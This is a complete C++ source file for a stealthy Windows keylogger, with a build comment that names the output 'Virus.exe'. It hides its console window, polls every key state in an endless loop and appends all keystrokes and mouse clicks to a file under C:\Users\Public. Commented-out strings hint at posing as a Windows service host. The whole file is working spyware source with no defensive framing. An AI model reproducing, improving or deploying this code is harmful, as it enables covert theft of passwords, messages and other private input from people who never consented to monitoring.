//Excecute with cl.exe /EHsc KeyLoggerV1.cpp /link /SUBSYSTEM:WINDOWS  /OUT:"Virus.exe"

#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <fstream>
#pragma comment(lib, "User32.lib")

using namespace std;
//const char* title = "Service Host: Client DDRP";
//const char* info = "Info";

const char* path = "C:\\Users\\Public\\Logs.txt";


void save();
void background();

int main()
{

    background();
    save();

    return 0;
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    background();
    save();
    return 0;
}


void save(){
    char c;
    while (true)
    {
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                ofstream write(path, ios::app);
                if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if ((c > 64) && (c < 91))
                {
                    write << c;
                    write.close();
                    break;
                }
                else
                {
                    switch (c)
                    {
                    case 48:
                        if (GetAsyncKeyState(0x10))
                            write << ")";
                        else
                            write << "0";
                        break;
                    case 49:
                        if (GetAsyncKeyState(0x10))
                            write << "!";
                        else
                            write << "1";
                        break;
                    case 50:
                        if (GetAsyncKeyState(0x10))
                            write << "@";
                        else
                            write << "2";
                        break;
                    case 51:
                        if (GetAsyncKeyState(0x10))
                            write << "#";
                        else
                            write << "3";
                        break;
                    case 52:
                        if (GetAsyncKeyState(0x10))
                            write << "$";
                        else
                            write << "4";
                        break;
                    case 53:
                        if (GetAsyncKeyState(0x10))
                            write << "%";
                        else
                            write << "5";
                        break;
                    case 54:
                        if (GetAsyncKeyState(0x10))
                            write << "^";
                        else
                            write << "6";
                        break;
                    case 55:
                        if (GetAsyncKeyState(0x10))
                            write << "&";
                        else
                            write << "7";
                        break;
                    case 56:
                        if (GetAsyncKeyState(0x10))
                            write << "*";
                        else
                            write << "8";
                        break;
                    case 57:
                        if (GetAsyncKeyState(0x10))
                            write << "(";
                        else
                            write << "9";
                        break;
                    case VK_SPACE:
                        write << " ";
                        break;
                    case VK_RETURN:
                        write << "\n";
                        break;
                    case VK_TAB:
                        write << "<Tab>";
                        break;
                    case VK_BACK:
                        write << "<BackSpace>";
                        break;
                    case VK_ESCAPE:
                        write << "<Esc>";
                        break;
                    case VK_DELETE:
                        write << "<Delete>";
                        break;
                    case VK_CONTROL:
                        write << "<Ctrl>";
                        break;
                    case VK_END:
                        write << "<End>";
                        break;
                    case VK_HOME:
                        write << "<Home>";
                        break;
                    case VK_LEFT:
                        write << "<Left>";
                        break;
                    case VK_UP:
                        write << "<Up>";
                        break;
                    case VK_RIGHT:
                        write << "<Right>";
                        break;
                    case VK_DOWN:
                        write << "<Down>";
                        break;
                    case VK_OEM_1:
                        if (GetAsyncKeyState(0x10))
                            write << ":";
                        else
                            write << ";";
                        break;
                    case VK_OEM_2:
                        if (GetAsyncKeyState(0x10))
                            write << "?";
                        else
                            write << "/";
                        break;
                    case VK_OEM_3:
                        if (GetAsyncKeyState(0x10))
                            write << "~";
                        else
                            write << "`";
                        break;
                    case VK_OEM_4:
                        if (GetAsyncKeyState(0x10))
                            write << "{";
                        else
                            write << "[";
                        break;
                    case VK_OEM_5:
                        if (GetAsyncKeyState(0x10))
                            write << "|";
                        else
                            write << "\\";
                        break;
                    case VK_OEM_6:
                        if (GetAsyncKeyState(0x10))
                            write << "}";
                        else
                            write << "]";
                        break;
                    case VK_OEM_7:
                        if (GetAsyncKeyState(0x10))
                            write << "\"";
                        else
                            write << "'";
                        break;
                    case VK_OEM_PLUS:
                        if (GetAsyncKeyState(0x10))
                            write << "+";
                        else
                            write << "=";
                        break;
                    case VK_OEM_COMMA:
                        if (GetAsyncKeyState(0x10))
                            write << "<";
                        else
                            write << ",";
                        break;
                    case VK_OEM_MINUS:
                        if (GetAsyncKeyState(0x10))
                            write << "_";
                        else
                            write << "-";
                        break;
                    case VK_OEM_PERIOD:
                        if (GetAsyncKeyState(0x10))
                            write << ">";
                        else
                            write << ".";
                        break;
                    case VK_CAPITAL:
                        write << "<CapsLock>";
                        break;
                    case VK_SHIFT:
                        write << "<Shift>";
                        break;
                    case VK_MENU:   
                        write << "<Alt>";
                        break;
                    case VK_F1:
                        write << "<F1>";
                        break;
                    case VK_F2:
                        write << "<F2>";
                        break;
                    case VK_F3:
                        write << "<F3>";
                        break;
                    case VK_F4:
                        write << "<F4>";
                        break;
                    case VK_F5:
                        write << "<F5>";
                        break;
                    case VK_F6:
                        write << "<F6>";
                        break;
                    case VK_F7:
                        write << "<F7>";
                        break;
                    case VK_F8:
                        write << "<F8>";
                        break;
                    case VK_F9:
                        write << "<F9>";
                        break;
                    case VK_F10:
                        write << "<F10>";
                        break;
                    case VK_F11:
                        write << "<F11>";
                        break;
                    case VK_F12:
                        write << "<F12>";
                        break;
                    case VK_NUMPAD0:
                        write << "0";
                        break;
                    case VK_NUMPAD1:
                        write << "1";
                        break;
                    case VK_NUMPAD2:
                        write << "2";
                        break;
                    case VK_NUMPAD3:
                        write << "3";
                        break;
                    case VK_NUMPAD4:
                        write << "4";
                        break;
                    case VK_NUMPAD5:
                        write << "5";
                        break;
                    case VK_NUMPAD6:
                        write << "6";
                        break;
                    case VK_NUMPAD7:
                        write << "7";
                        break;
                    case VK_NUMPAD8:
                        write << "8";
                        break;
                    case VK_NUMPAD9:    
                        write << "9";
                        break;
                    case VK_MULTIPLY:
                        write << "*";
                        break;
                    case VK_ADD:
                        write << "+";
                        break;
                    case VK_SUBTRACT:
                        write << "-";
                        break;
                    case VK_DECIMAL:
                        write << ".";
                        break;
                    case VK_DIVIDE:
                        write << "/";
                        break;
                    case VK_LBUTTON:
                        write << "<LeftClick>";
                        break;
                    case VK_RBUTTON:
                        write << "<RightClick>";
                        break;
                    case VK_MBUTTON:
                        write << "<MiddleClick>";
                        break;
                    case VK_XBUTTON1:
                        write << "<XButton1>";
                        break;
                    case VK_XBUTTON2:
                        write << "<XButton2>";
                        break;
                    case VK_VOLUME_MUTE:
                        write << "<VolumeMute>";
                        break;
                    case VK_VOLUME_DOWN:
                        write << "<VolumeDown>";
                        break;
                    case VK_VOLUME_UP:
                        write << "<VolumeUp>";
                        break;
                    case VK_MEDIA_NEXT_TRACK:
                        write << "<NextTrack>";
                        break;
                    case VK_MEDIA_PREV_TRACK:
                        write << "<PrevTrack>";
                        break;
                    case VK_MEDIA_STOP:
                        write << "<Stop>";
                        break;
                    case VK_MEDIA_PLAY_PAUSE:
                        write << "<PlayPause>";
                        break;
                    case VK_LAUNCH_MAIL:
                        write << "<LaunchMail>";
                        break;
                    case VK_LAUNCH_MEDIA_SELECT:
                        write << "<LaunchMediaSelect>";
                        break;
                    case VK_LAUNCH_APP1:
                        write << "<LaunchApp1>";
                        break;
                    case VK_LAUNCH_APP2:
                        write << "<LaunchApp2>";
                        break;
                    case VK_OEM_102:
                        write << "<OEM102>";
                        break;
                    case VK_PROCESSKEY:
                        write << "<ProcessKey>";
                        break;
                    case VK_ATTN:
                        write << "<Attn>";
                        break;
                    case VK_CRSEL:
                        write << "<CrSel>";
                        break;
                    case VK_EXSEL:
                        write << "<ExSel>";
                        break;
                    case VK_EREOF:
                        write << "<EraseEOF>";
                        break;
                    case VK_PLAY:
                        write << "<Play>";
                        break;
                    case VK_ZOOM:
                        write << "<Zoom>";
                        break;
                    case VK_PA1:
                        write << "<PA1>";
                        break;
                    case VK_OEM_CLEAR:
                        write << "<OEMClear>";
                        break;
                    default:
                        write << c;
                    }
                    write.close();
                }
            }
        }
    }
}

void background() {
    HWND stealth;
    AllocConsole(); 
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    if (stealth) {
        ShowWindow(stealth, 0); 
    }
}


